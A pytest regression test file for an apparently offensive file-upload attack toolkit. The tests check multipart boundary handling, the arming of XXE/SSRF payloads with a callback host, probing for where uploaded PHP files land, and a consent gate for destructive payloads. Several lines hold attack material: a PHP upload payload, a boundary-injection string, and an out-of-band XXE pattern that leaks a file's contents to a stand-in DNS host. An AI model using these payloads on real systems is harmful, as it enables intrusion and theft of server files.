"""Regression tests for bugs found while reviewing the field helpers."""
import pytest

from upload_arsenal import rawhttp
from upload_arsenal.manifest import Manifest, callback_token
from upload_arsenal.helpers import callback, hunter, uploader


RAW = ("POST /up HTTP/1.1\r\nHost: t.example\r\n"
       "Content-Type: multipart/form-data; boundary=BB\r\n\r\n"
       "--BB\r\n"
       'Content-Disposition: form-data; name="f"; filename="a.jpg"\r\n\r\n'
       "X\r\n--BB--\r\n")


# --------------------------------------------------------------------------- #
# 1. A payload containing the captured boundary must not corrupt the body.
# --------------------------------------------------------------------------- #
def test_payload_containing_boundary_is_not_corrupted():
    tmpl = rawhttp.UploadTemplate.from_request(rawhttp.parse_raw_request(RAW))
    evil = b"header\r\n--BB\r\ninjected\r\n--BB--\r\n"
    out = tmpl.render(evil, "p.php")
    # the body must be re-keyed on a boundary absent from the payload
    assert out.boundary != "BB"
    assert f"boundary={out.boundary}" in out.content_type
    parts = rawhttp.parse_multipart(out.body, out.boundary)
    assert [p.name for p in parts] == ["f"]
    assert parts[0].data == evil            # byte-for-byte intact


def test_boundary_kept_when_no_collision():
    tmpl = rawhttp.UploadTemplate.from_request(rawhttp.parse_raw_request(RAW))
    out = tmpl.render(b"<?php echo 1;?>", "p.php")
    assert out.boundary == "BB"              # untouched capture


# --------------------------------------------------------------------------- #
# 2. Arming must be idempotent (no nested tokens).
# --------------------------------------------------------------------------- #
def test_arming_twice_does_not_nest_tokens(suite):
    man = Manifest.load(str(suite))
    xxe = next(e for e in man.entries if e.path.endswith("xxe_ssrf.xml"))
    token = callback_token(xxe)

    callback.arm_manifest(man, "cb.example", dns_domain=None, quiet=True)
    once = Manifest.load(str(suite)).read_bytes(xxe).decode()
    callback.arm_manifest(Manifest.load(str(suite)), "cb.example",
                          dns_domain=None, quiet=True)
    twice = Manifest.load(str(suite)).read_bytes(xxe).decode()

    assert once == twice
    assert twice.count(token) == 1
    assert f"cb.example/{token}/xxe-ssrf" in twice


def test_rearming_to_a_new_host_replaces_the_old(suite):
    man = Manifest.load(str(suite))
    xxe = next(e for e in man.entries if e.path.endswith("xxe_ssrf.xml"))
    callback.arm_manifest(man, "old.example", dns_domain=None, quiet=True)
    callback.arm_manifest(Manifest.load(str(suite)), "new.example",
                          dns_domain=None, quiet=True)
    body = Manifest.load(str(suite)).read_bytes(xxe).decode()
    assert "old.example" not in body
    assert f"new.example/{callback_token(xxe)}/xxe-ssrf" in body


# --------------------------------------------------------------------------- #
# 3. DNS arming must put the exfiltrated entity in the hostname.
# --------------------------------------------------------------------------- #
def test_dns_arming_moves_entity_into_hostname(suite):
    man = Manifest.load(str(suite))
    dtd = next(e for e in man.entries if e.path.endswith("evil.dtd"))
    token = callback_token(dtd)
    callback.arm_manifest(man, "cb.example", dns_domain="oob.example.com",
                          quiet=True)
    body = Manifest.load(str(suite)).read_bytes(dtd).decode()
    # the lookup itself carries the data ...
    assert f"http://%file;.{token}.oob.example.com/" in body
    # ... and it is not left dangling off a query parameter, which would
    # produce no DNS lookup at all.
    assert "?x=%file;" not in body


# --------------------------------------------------------------------------- #
# 4. Hunter probe ordering must cover every directory before renames.
# --------------------------------------------------------------------------- #
def test_plain_filename_probed_in_every_directory_first():
    urls = hunter.candidate_urls("https://t/", "poc.php.png",
                                 hunter.DEFAULT_DIRS)
    head = urls[:len(hunter.DEFAULT_DIRS)]
    # every directory gets the unchanged filename before anything else
    assert all(u.endswith("poc.php.png") for u in head)
    assert len({u for u in head}) == len(hunter.DEFAULT_DIRS)
    # notably, a deep-but-common location is not starved by the probe cap
    assert "https://t/wp-content/uploads/poc.php.png" in urls[:400]


def test_candidate_urls_are_unique():
    urls = hunter.candidate_urls("https://t/", "a.php", hunter.DEFAULT_DIRS)
    assert len(urls) == len(set(urls))


# --------------------------------------------------------------------------- #
# 5. Destructive payloads need explicit authorization before being sent.
# --------------------------------------------------------------------------- #
class _Args:
    yes = False
    dry_run = False


def test_destructive_upload_refused_without_consent(ctf_suite, monkeypatch):
    man = Manifest.load(str(ctf_suite))
    bomb = [e for e in man.entries if e.risk == "destructive"]
    assert bomb, "ctf profile should emit destructive payloads"
    monkeypatch.setattr("sys.stdin.isatty", lambda: False, raising=False)
    assert uploader.confirm_destructive(bomb, _Args()) is False


def test_destructive_upload_allowed_with_yes(ctf_suite):
    man = Manifest.load(str(ctf_suite))
    args = _Args()
    args.yes = True
    assert uploader.confirm_destructive(man.entries, args) is True


def test_destructive_upload_refused_end_to_end(ctf_suite, http_server, tmp_path,
                                               monkeypatch, capsys):
    """The CLI must refuse, and send nothing, without -y."""
    raw = (f"POST /upload HTTP/1.1\r\nHost: 127.0.0.1\r\n"
           f"Content-Type: multipart/form-data; boundary=BB\r\n\r\n"
           f"--BB\r\n"
           f'Content-Disposition: form-data; name="file"; filename="a.jpg"\r\n\r\n'
           f"OLD\r\n--BB--\r\n")
    req = tmp_path / "r.txt"
    req.write_text(raw)
    monkeypatch.setattr("sys.stdin.isatty", lambda: False, raising=False)
    rc = uploader.main(["-m", str(ctf_suite), "-r", str(req),
                        "--risk", "destructive", "--scheme", "http"])
    assert rc == 2
    assert http_server.requests == []


def test_safe_payloads_need_no_consent(suite):
    man = Manifest.load(str(suite))
    safe = [e for e in man.entries if e.risk == "safe"]
    assert uploader.confirm_destructive(safe, _Args()) is True
